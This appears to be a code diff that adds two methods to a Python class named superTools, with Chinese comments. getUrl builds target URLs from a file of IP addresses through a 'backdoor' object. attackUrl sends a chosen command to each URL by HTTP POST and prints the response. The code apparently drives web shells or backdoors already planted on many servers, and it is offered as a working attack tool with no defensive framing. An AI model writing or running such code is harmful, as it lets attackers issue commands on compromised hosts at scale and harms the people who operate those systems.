@@ -92,3 +92,46 @@ class superTools:
                 print("执行失败: 失败原因连接时间过长")
             else:
                 print("执行失败:", str(e))
+
+    def getUrl(self, fileAddress=""):
+        """
+        根据提供的文件地址，生成对应的 URL 列表。
+
+        Args:
+            fileAddress (str): 包含 IP 地址的文件地址。
+
+        Returns:
+            list: 包含所有 IP 地址对应的 URL 的列表。
+
+        Example:
+            示例用法:
+            - 调用 `getUrl(fileAddress)` 方法来生成 URL 列表。
+        """
+        # 获取文件中的 IP 地址列表
+        self.backdoor.getFileAddress(fileAddress)
+
+        urls = []  # 用于存储所有 URL 的列表
+
+        for ip in self.backdoor.readIPs():
+            url = self.backdoor.splice_IP_Url(ip)
+            urls.append(url)  # 将生成的 URL 添加到列表中
+
+        return urls  # 返回包含所有 IP 地址对应的 URL 的列表
+
+    def attackUrl(self, Url, codeCmd, password="", timeoutValue: int = 2):
+        try:
+            self.backdoor.setCodeCmd(codeCmd)
+            # 发送HTTP请求，设置连接超时为指定时间
+            response = requests.post(
+                Url, data=self.backdoor.post_data, timeout=timeoutValue)
+            # 检查响应状态码
+            if response.status_code != 200:
+                print("连接失败")
+            print('---------------------响应---------------------')
+            print(response.text)
+            print('----------------------------------------------')
+        except RequestException as e:
+            if "timeout" in str(e):
+                print("执行失败: 失败原因连接时间过长")
+            else:
+                print("执行失败:", str(e))
